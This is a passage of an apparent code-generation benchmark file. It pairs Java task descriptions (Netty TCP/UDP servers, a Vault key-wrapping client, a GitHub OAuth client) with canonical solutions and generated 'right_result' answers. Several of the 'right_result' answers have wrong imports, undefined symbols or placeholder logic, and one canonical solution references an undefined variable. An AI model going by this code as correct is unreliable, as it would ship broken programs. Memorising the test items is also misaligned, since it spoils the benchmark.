    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ProxyServerContainer {\n    private final EventLoopGroup serverBossGroup;\n    private final EventLoopGroup serverWorkerGroup;\n    private final Logger logger;\n\n    public ProxyServerContainer() {\n        serverBossGroup = new NioEventLoopGroup();\n        serverWorkerGroup = new NioEventLoopGroup();\n        logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n    }\n\n    public void start() {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, null, new java.security.SecureRandom());\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(serverBossGroup, serverWorkerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(createSslHandler(sslContext, false));\n                            pipeline.addLast(new IdleStateHandler(0, 0, 30000));\n                            pipeline.addLast(new LengthFieldBasedFrameDecoder(1024 * 1024, 0, 2, 0, 2));\n                            pipeline.addLast(new CustomMessageHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .childOption(ChannelOption.SO_REUSEADDR, true);\n            ChannelFuture future = bootstrap.bind(8080).sync();\n            future.awaitUninterruptibly();\n            logger.info(\"Server started on port 8080\");\n        } catch (Exception e) {\n            logger.error(\"Error starting server\", e);\n        }\n    }\n\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext, boolean needsClientAuth) {\n        return new SslHandler(sslContext, needsClientAuth);\n    }\n\n    private static class CustomMessageHandler extends io.netty.handler.codec.MessageToMessageEncoder<String> {\n        @Override\n        protected void encode(ChannelHandlerContext ctx, String msg, List<Object> out) throws Exception {\n            out.add(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\"Exception caught\", cause);\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that handles client connections and processes Protocol Buffers (protobuf) messages with support for idle connection detection and custom message handling.\n\nClass Description: ProtobufProxy is a Netty-based TCP server implementation that establishes a server socket, configures protocol buffer message handling, and manages client connections. It includes idle connection detection, protobuf message encoding/decoding, and custom business logic handlers.\n\nAttributes: None (This class doesn't maintain any instance attributes, using local variables within methods instead)\n\nMethods:\n1: start(int port) -> void - Initializes and starts the Netty TCP server on the specified port. Creates event loop groups, configures server bootstrap with protobuf handlers, binds to the port, and manages server lifecycle. The method blocks until server shutdown.\n   - Input Parameters:\n     - port: int - The TCP port number to bind the server to\n   - Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.entity.ServerTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\nimport org.nico.ratel.landlords.server.ServerContains;\nimport org.nico.ratel.landlords.server.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.server.handler.ProtobufTransferHandler;\n\nimport java.net.InetSocketAddress;\nimport java.util.Timer;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                .addLast(new ProtobufVarint32FrameDecoder())\n                                .addLast(new ProtobufDecoder(ServerTransferData.ServerTransferDataProtoc.getDefaultInstance()))\n                                .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                .addLast(new ProtobufEncoder())\n                                .addLast(new SecondProtobufCodec())\n                                .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The protobuf server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n\n            ServerContains.THREAD_EXCUTER.execute(() -> {\n                Timer timer = new Timer();\n                timer.schedule(new RoomClearTask(), 0L, 3000L);\n            });\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.ChannelPipeline;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.SocketChannel;  \nimport io.netty.channel.socket.nio.NioServerSocketChannel;  \nimport io.netty.handler.timeout.IdleStateHandler;  \nimport io.netty.handler.codec.frame.LengthFieldBasedFrameDecoder;  \nimport io.netty.handler.codec.protobuf.ProtobufDecoder;  \nimport io.netty.handler.logging.LogLevel;  \nimport io.netty.handler.logging.LoggingHandler;  \nimport io.netty.buffer.ByteBuf;  \nimport io.netty.channel.ChannelHandlerContext;  \nimport io.netty.channel.ChannelHandler.Sharable;  \nimport io.netty.channel.SimpleChannelInboundHandler;  \nimport io.netty.util.concurrent.TimeUnit;  \n\nimport com.example.MyMessage;  \n\n@Sharable  \nstatic class MyCustomHandler extends SimpleChannelInboundHandler<MyMessage> {  \n    @Override  \n    protected void channelRead0(ChannelHandlerContext ctx, MyMessage msg) {  \n        System.out.println(\"Received message: \" + msg);  \n    }  \n\n    @Override  \n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n        cause.printStackTrace();  \n        ctx.close();  \n    }  \n}  \n\npublic class ProtobufProxy {  \n    public void start(int port) {  \n        EventLoopGroup bossGroup = new NioEventLoopGroup();  \n        EventLoopGroup workerGroup = new NioEventLoopGroup();  \n        try {  \n            ServerBootstrap b = new ServerBootstrap();  \n            b.group(bossGroup, workerGroup)  \n             .channel(NioServerSocketChannel.class)  \n             .childHandler(new ChannelInitializer<SocketChannel>() {  \n                 @Override  \n                 protected void initChannel(SocketChannel ch) throws Exception {  \n                     ChannelPipeline p = ch.pipeline();  \n                     p.addLast(new IdleStateHandler(30, 0, 0, TimeUnit.SECONDS));  \n                     p.addLast(new LengthFieldBasedFrameDecoder(8192, 0, 4, 0, 4, true));  \n                     p.addLast(new ProtobufDecoder(MyMessage.class));  \n                     p.addLast(new MyCustomHandler());  \n                 }  \n             })  \n             .childOption(ChannelOption.SO_REUSEADDR, true)  \n             .childOption(ChannelOption.SO_KEEPALIVE, true);  \n            ChannelFuture future = b.bind(port).sync();  \n            future.channel().closeFuture().sync();  \n        } catch (Exception e) {  \n            e.printStackTrace();  \n        } finally {  \n            workerGroup.shutdownGracefully();  \n            bossGroup.shutdownGracefully();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Create a Java class that implements a UDP echo server using Netty framework, capable of receiving datagrams and echoing them back to the sender.\n\nClass Description: DatagramChannelEchoServer is a Netty-based UDP server that listens on a specified port, receives incoming datagrams, and echoes them back to the sender. The server handles network operations asynchronously and includes proper resource cleanup.\n\nAttributes:\n- group: [NioEventLoopGroup] - Handles I/O operations asynchronously\n- bootstrap: [Bootstrap] - Configures and initializes the Netty server\n- channelFuture: [ChannelFuture] - Represents the result of an asynchronous channel operation\n- DEFAULT_PORT: [int] - Default port number (7) if none specified\n\nMethods:\n- start([int port]) -> [void] - Starts the UDP server on the specified port, initializes Netty components, and binds to the port\n- shutdown() -> [void] - Gracefully shuts down the server and releases resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server\n\nThe class should use NioDatagramChannel for UDP transport, enable SO_BROADCAST option, and include proper error handling and resource cleanup. The server should continue running until explicitly stopped, echoing all received datagrams back to their senders.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\npublic class DatagramChannelEchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelFuture channelFuture;\n\n    public void start(int port) throws Exception {\n        group = new NioEventLoopGroup();\n        \n        try {\n            bootstrap = new Bootstrap();\n            \n            bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new DatagramChannelEchoServerHandler());\n            \n            channelFuture = bootstrap.bind(port).sync();\n            System.out.println(\"DatagramChannelEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            \n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelHandler;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.ChannelPipeline;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.NioDatagramChannel;  \nimport io.netty.channel.socket.DatagramPacket;  \nimport io.netty.channel.socket.nio.NioDatagramChannel;  \nimport io.netty.channel.ChannelInboundHandlerAdapter;  \nimport io.netty.util.concurrent.DefaultEventExecutorGroup;  \n\npublic class DatagramChannelEchoServer {  \n    private final EventLoopGroup group;  \n    private final Bootstrap bootstrap;  \n    private ChannelFuture channelFuture;  \n    private static final int DEFAULT_PORT = 7;  \n\n    public DatagramChannelEchoServer() {  \n        group = new NioEventLoopGroup();  \n        bootstrap = new Bootstrap();  \n        bootstrap.group(group)  \n                .channel(NioDatagramChannel.class)  \n                .option(ChannelOption.SO_BROADCAST, true)  \n                .handler(new ChannelInitializer<Channel>() {  \n                    @Override  \n                    protected void initChannel(Channel ch) throws Exception {  \n                        ch.pipeline().addLast(new UdpServerHandler());  \n                    }  \n                });  \n    }  \n\n    public void start(int port) {  \n        channelFuture = bootstrap.bind(port).sync();  \n    }  \n\n    public void shutdown() {  \n        group.shutdownGracefully();  \n        channelFuture.channel().closeFuture().await();  \n    }  \n\n    public static void main(String[] args) {  \n        int port = DEFAULT_PORT;  \n        if (args.length > 0) {  \n            port = Integer.parseInt(args[0]);  \n        }  \n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();  \n        server.start(port);  \n    }  \n\n    private static class UdpServerHandler extends ChannelInboundHandlerAdapter {  \n        @Override  \n        public void channelRead(ChannelHandlerContext ctx, Object msg) {  \n            if (msg instanceof DatagramPacket) {  \n                DatagramPacket packet = (DatagramPacket) msg;  \n                ctx.writeAndFlush(packet);  \n            }  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 239,
    "Instruction": "Task Description: Implement a VaultClient class that interacts with a Vault server's transit engine to perform key wrapping and unwrapping operations for cryptographic purposes, using HTTP REST API calls.\n\nClass Description: The VaultClient class implements the KmsClient interface and provides functionality to encrypt (wrap) and decrypt (unwrap) keys using a Vault server's transit engine. It handles HTTP communication, request building, response processing, and error handling.\n\nAttributes:\n- LOG: Logger - Used for logging information and errors\n- JSON_MEDIA_TYPE: MediaType - Constant for JSON content type\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- kmsToken: String - Authentication token for Vault server\n- hadoopConfiguration: Configuration - Hadoop configuration object\n- endPointPrefix: String - Base URL prefix for Vault API endpoints\n- httpClient: OkHttpClient - HTTP client for making requests\n\nMethods:\n- getContentFromTransitEngine(String, String, String) -> String - Sends a POST request to Vault's transit engine endpoint with the given payload and master key identifier\n- executeAndGetResponse(String, Request) -> String - Executes HTTP request and handles response, including error cases\n- buildPayload(Map<String, String>) -> String - Converts a parameter map to JSON string\n- wrapKey(byte[], String) -> String - Encrypts/wraps a key using the specified master key\n- unwrapKey(String, String) -> byte[] - Decrypts/unwraps a key using the specified master key\n- parseReturn(String, String) -> String - Parses the response from Vault to extract the required value\n- refreshToken() -> void - Refreshes the authentication token (implementation not shown in reference code)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport java.io.IOException;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\nimport okhttp3.ConnectionSpec;\nimport okhttp3.MediaType;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.RequestBody;\nimport okhttp3.Response;\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.parquet.crypto.KeyAccessDeniedException;\nimport org.apache.parquet.crypto.ParquetCryptoRuntimeException;\nimport org.apache.parquet.crypto.keytools.KeyToolkit;\nimport org.apache.parquet.crypto.keytools.KmsClient;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class VaultClient implements KmsClient {\n  private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n  private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n  private static final ObjectMapper objectMapper = new ObjectMapper();\n\n  private String kmsToken;\n  private Configuration hadoopConfiguration;\n  private String endPointPrefix;\n  private OkHttpClient httpClient = new OkHttpClient.Builder()\n      .connectionSpecs(Arrays.asList(ConnectionSpec.MODERN_TLS, ConnectionSpec.COMPATIBLE_TLS))\n      .build();\n\n  private String getContentFromTransitEngine(String endPoint, String jPayload, String masterKeyIdentifier) {\n    LOG.info(\"masterKeyIdentifier: \" + masterKeyIdentifier);\n\n    final RequestBody requestBody = RequestBody.create(JSON_MEDIA_TYPE, jPayload);\n    Request request = new Request.Builder()\n        .url(endPoint + masterKeyIdentifier)\n        .header(\"X-Vault-Token\", kmsToken)\n        .post(requestBody)\n        .build();\n\n    return executeAndGetResponse(endPoint, request);\n  }\n\n  private String executeAndGetResponse(String endPoint, Request request) {\n    Response response = null;\n    try {\n      response = httpClient.newCall(request).execute();\n      final String responseBody = response.body().string();\n      if (response.isSuccessful()) {\n        return responseBody;\n      } else {\n        if ((401 == response.code()) || (403 == response.code())) {\n          throw new KeyAccessDeniedException(responseBody);\n        }\n        throw new IOException(\"Vault call [\" + endPoint + \"] didn't succeed: \" + responseBody);\n      }\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Vault call [\" + request.url().toString() + endPoint + \"] didn't succeed\", e);\n    } finally {\n      if (null != response) {\n        response.close();\n      }\n    }\n  }\n\n  private String buildPayload(Map<String, String> paramMap) {\n    String jsonValue;\n    try {\n      jsonValue = objectMapper.writeValueAsString(paramMap);\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\"Failed to build payload\", e);\n    }\n    return jsonValue;\n  }\n\n  @Override\n  public String wrapKey(byte[] keyBytes, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    final String dataKeyStr = Base64.getEncoder().encodeToString(keyBytes);\n    writeKeyMap.put(\"plaintext\", dataKeyStr);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"encrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    return parseReturn(response, \"ciphertext\");\n  }\n\n  @Override\n  public byte[] unwrapKey(String wrappedKey, String masterKeyIdentifier) throws KeyAccessDeniedException {\n    refreshToken();\n    Map<String, String> writeKeyMap = new HashMap<String, String>(1);\n    writeKeyMap.put(\"ciphertext\", wrappedKey);\n    String response = getContentFromTransitEngine(\n        endPointPrefix + \"decrypt/\", buildPayload(writeKeyMap), masterKeyIdentifier);\n    String plaintext = parseReturn(response, \"plaintext\");\n    return Base64.getDecoder().decode(plaintext);\n  }\n\n  private static String parseReturn(String response, String searchKey) {\n    String matchingValue;\n    try {\n      matchingValue = objectMapper.readTree(response).findValue(searchKey).textValue();\n    } catch (IOException e) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to parse vault response. \" + searchKey + \" not found.\" + response, e);\n    }\n\n    if (null == matchingValue) {\n      throw new ParquetCryptoRuntimeException(\n          \"Failed to match vault response. \" + searchKey + \" not found.\" + response);\n    }\n    return matchingValue;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport okhttp3.*;\nimport org.apache.hadoop.conf.Configuration;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.util.Map;\n\npublic class VaultClient {\n    private static final Logger LOG = LoggerFactory.getLogger(VaultClient.class);\n    private static final MediaType JSON_MEDIA_TYPE = MediaType.get(\"application/json; charset=utf-8\");\n    private final ObjectMapper objectMapper;\n    private final String kmsToken;\n    private final Configuration hadoopConfiguration;\n    private final String endPointPrefix;\n    private final OkHttpClient httpClient;\n\n    public VaultClient(Configuration hadoopConfiguration, String endPointPrefix, String kmsToken) {\n        this.hadoopConfiguration = hadoopConfiguration;\n        this.endPointPrefix = endPointPrefix;\n        this.kmsToken = kmsToken;\n        this.objectMapper = new ObjectMapper();\n        this.httpClient = new OkHttpClient();\n    }\n\n    private String getContentFromTransitEngine(String path, String masterKeyId, String payload) throws IOException {\n        String url = endPointPrefix + path;\n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url)\n                .post(RequestBody.create(payload, JSON_MEDIA_TYPE))\n                .header(\"X-Vault-Token\", kmsToken);\n        Request request = requestBuilder.build();\n        Response response = httpClient.newCall(request).execute();\n        if (!response.isSuccessful()) {\n            LOG.error(\"Vault API request failed: {}\", response.code());\n            throw new IOException(\"Vault API request failed with code: \" + response.code());\n        }\n        return response.body().string();\n    }\n\n    private String executeAndGetResponse(String url, Request request) throws IOException {\n        Response response = httpClient.newCall(request).execute();\n        if (!response.isSuccessful()) {\n            LOG.error(\"HTTP request to {} failed with code: {}\", url, response.code());\n            throw new IOException(\"HTTP request failed: \" + response.message());\n        }\n        return response.body().string();\n    }\n\n    private String buildPayload(Map<String, String> parameters) throws IOException {\n        return objectMapper.writeValueAsString(parameters);\n    }\n\n    public String wrapKey(byte[] keyData, String masterKeyId) throws IOException {\n        Map<String, String> payload = Map.of(\"key\", Base64.getEncoder().encodeToString(keyData), \"master_key\", masterKeyId);\n        String jsonPayload = buildPayload(payload);\n        String response = getContentFromTransitEngine(\"/transit/encrypt\", masterKeyId, jsonPayload);\n        return parseReturn(response, \"data.wrapped_key\");\n    }\n\n    public byte[] unwrapKey(String encryptedKey, String masterKeyId) throws IOException {\n        Map<String, String> payload = Map.of(\"wrapped_key\", encryptedKey, \"master_key\", masterKeyId);\n        String jsonPayload = buildPayload(payload);\n        String response = getContentFromTransitEngine(\"/transit/decrypt\", masterKeyId, jsonPayload);\n        String decodedKey = parseReturn(response, \"data.plaintext\");\n        return Base64.getDecoder().decode(decodedKey);\n    }\n\n    private String parseReturn(String response, String fieldName) {\n        try {\n            return objectMapper.readTree(response).get(fieldName).asText();\n        } catch (Exception e) {\n            LOG.error(\"Failed to parse response: {}\", e.getMessage());\n            throw new RuntimeException(\"Error parsing Vault response\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Implement a Java class that interacts with GitHub's OAuth API to obtain an access token and retrieve user information using the OkHttp library for HTTP requests.\n\nClass Description: The `GithubProvider` class handles authentication with GitHub's OAuth API. It provides methods to obtain an access token using authorization code and to fetch GitHub user information using the obtained access token.\n\nAttributes:\n- clientId: String - GitHub OAuth application client ID (injected from configuration)\n- clientSecret: String - GitHub OAuth application client secret (injected from configuration)\n- redirectUri: String - Redirect URI registered with GitHub OAuth application (injected from configuration)\n\nMethods:\n- getAccessToken(AccessTokenDTO accessTokenDTO) -> String - Obtains an access token from GitHub's OAuth API. Takes an AccessTokenDTO object containing authorization code and other parameters, sets client credentials, makes a POST request to GitHub's token endpoint, and returns the access token.\n- getUser(String accessToken) -> GithubUser - Retrieves GitHub user information using the provided access token. Makes a GET request to GitHub's user API endpoint with the access token in the Authorization header and returns the user data as a GithubUser object.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport life.majiang.community.dto.AccessTokenDTO;\nimport life.majiang.community.provider.dto.GithubUser;\nimport okhttp3.*;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class GithubProvider {\n\n    @Value(\"${github.client.id}\")\n    private String clientId;\n\n    @Value(\"${github.client.secret}\")\n    private String clientSecret;\n\n    @Value(\"${github.redirect.uri}\")\n    private String redirectUri;\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) {\n        accessTokenDTO.setClient_id(clientId);\n        accessTokenDTO.setClient_secret(clientSecret);\n        accessTokenDTO.setRedirect_uri(redirectUri);\n        MediaType mediaType = MediaType.get(\"application/json; charset=utf-8\");\n        OkHttpClient client = new OkHttpClient();\n\n        RequestBody body = RequestBody.create(mediaType, JSON.toJSONString(accessTokenDTO));\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(body)\n                .build();\n        try (Response response = client.newCall(request).execute()) {\n            String string = response.body().string();\n            String token = string.split(\"&\")[0].split(\"=\")[1];\n            return token;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public GithubUser getUser(String accessToken) {\n        OkHttpClient client = new OkHttpClient();\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"token \" + accessToken)\n                .build();\n        try {\n            Response response = client.newCall(request).execute();\n            String string = response.body().string();\n            GithubUser githubUser = JSON.parseObject(string, GithubUser.class);\n            return githubUser;\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "right_result": "```java\nimport okhttp3.*;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class GithubProvider {\n    private final String clientId;\n    private final String clientSecret;\n    private final String redirectUri;\n\n    public GithubProvider(String clientId, String clientSecret, String redirectUri) {\n        this.clientId = clientId;\n        this.clientSecret = clientSecret;\n        this.redirectUri = redirectUri;\n    }\n\n    public String getAccessToken(AccessTokenDTO accessTokenDTO) throws IOException {\n        OkHttpClient client = new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(10, TimeUnit.SECONDS)\n                .build();\n\n        FormBody formBody = new FormBody.Builder()\n                .add(\"client_id\", clientId)\n                .add(\"client_secret\", clientSecret)\n                .add(\"code\", accessTokenDTO.getCode())\n                .add(\"redirect_uri\", redirectUri)\n                .build();\n\n        Request request = new Request.Builder()\n                .url(\"https://github.com/login/oauth/access_token\")\n                .post(formBody)\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            String[] params = responseBody.split(\"&\");\n            for (String param : params) {\n                if (param.startsWith(\"access_token\")) {\n                    String[] keyValue = param.split(\"=\");\n                    return keyValue[1];\n                }\n            }\n            return null;\n        }\n    }\n\n    public GithubUser getUser(String accessToken) throws IOException {\n        OkHttpClient client = new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(10, TimeUnit.SECONDS)\n                .build();\n\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/user\")\n                .header(\"Authorization\", \"Bearer \" + accessToken)\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseBody = response.body().string();\n            return parseGithubUser(responseBody);\n        }\n    }\n\n    private GithubUser parseGithubUser(String json) {\n        GithubUser user = new GithubUser();\n        // Simplified parsing for demonstration; actual parsing would require a proper JSON library\n        // This is a placeholder and assumes the JSON structure matches the expected format\n        // In a real scenario, use a JSON parser like Gson or Jackson\n        return user;\n    }\n\n    static class AccessTokenDTO {\n        private String code;\n        // Add other required parameters as needed\n        public String getCode() {\n            return code;\n        }\n        public void setCode(String code) {\n            this.code = code;\n        }\n    }\n\n    static class GithubUser {\n        private int id;\n        private String login;\n        private String name;\n        // Add other fields as needed\n\n        public int getId() {\n            return id;\n        }\n        public void setId(int id) {\n            this.id = id;\n        }\n        public String getLogin() {\n            return login;\n        }\n        public void setLogin(String login) {\n            this.login = login;\n        }\n        public String getName() {\n            return name;\n        }\n        public void setName(String name) {\n            this.name = name;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 241,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for inter-process communication using HTTP, with support for handling both client and server errors, and token-based authentication.\n\nClass Description: The BeaconClient class is a RESTful HTTP client designed for inter-process communication. It handles HTTP requests and responses, manages authentication tokens, and provides error handling for both client-side (4xx) and server-side (5xx) errors. The class uses Java's HttpClient for communication and Jackson for JSON serialization/deserialization.\n\nAttributes:\n- port: int - The port number on which the server is running (localhost)\n- token: String - The authentication token used for Bearer token authorization (optional)\n\nMethods:\n- performRequest: <RES> performRequest(BeaconInterface<?> prov, String rawNode) -> RES - Sends an HTTP POST request to the specified path with the given content. Handles authentication and error responses. Returns the deserialized response object.\n- performRequest: <REQ, RES> performRequest(REQ req) -> RES - Converts the request object to JSON and sends it to the appropriate endpoint determined by the request type. Returns the deserialized response object.\n- parseClientError: Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) -> Optional<BeaconClientErrorResponse> - Parses and returns client error responses (4xx status codes) from the server.\n- parseServerError: Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) -> Optional<BeaconServerErrorResponse> - Parses and returns server error responses (5xx status codes) from the server.",
    "Canonical_solution": "import io.xpipe.beacon.api.HandshakeExchange;\nimport io.xpipe.core.util.JacksonMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.file.Files;\nimport java.util.Optional;\n\npublic class BeaconClient {\n\n    private final int port;\n    private String token;\n\n    public BeaconClient(int port) {\n        this.port = port;\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode)\n            throws BeaconConnectorException, BeaconClientException, BeaconServerException {\n        var client = HttpClient.newHttpClient();\n        HttpResponse<String> response;\n        try {\n            var uri = URI.create(\"http://127.0.0.1:\" + port + prov.getPath());\n            var builder = HttpRequest.newBuilder();\n            if (token != null) {\n                builder.header(\"Authorization\", \"Bearer \" + token);\n            }\n            var httpRequest = builder.uri(uri)\n                    .POST(HttpRequest.BodyPublishers.ofString(content))\n                    .build();\n            response = client.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n        } catch (Exception ex) {\n            throw new BeaconConnectorException(\"Couldn't send request\", ex);\n        }\n\n        var se = parseServerError(response);\n        if (se.isPresent()) {\n            se.get().throwError();\n        }\n\n        var ce = parseClientError(response);\n        if (ce.isPresent()) {\n            throw ce.get().throwException();\n        }\n\n        try {\n            var reader = JacksonMapper.getDefault().readerFor(prov.getResponseClass());\n            var emptyResponseClass = prov.getResponseClass().getDeclaredFields().length == 0;\n            var body = response.body();\n            if (emptyResponseClass && body.isBlank()) {\n                return createDefaultResponse(prov);\n            }\n            var v = (RES) reader.readValue(body);\n            return v;\n        } catch (IOException ex) {\n            throw new BeaconConnectorException(\"Couldn't parse response\", ex);\n        }\n    }\n\n    public <REQ, RES> RES performRequest(REQ req)\n            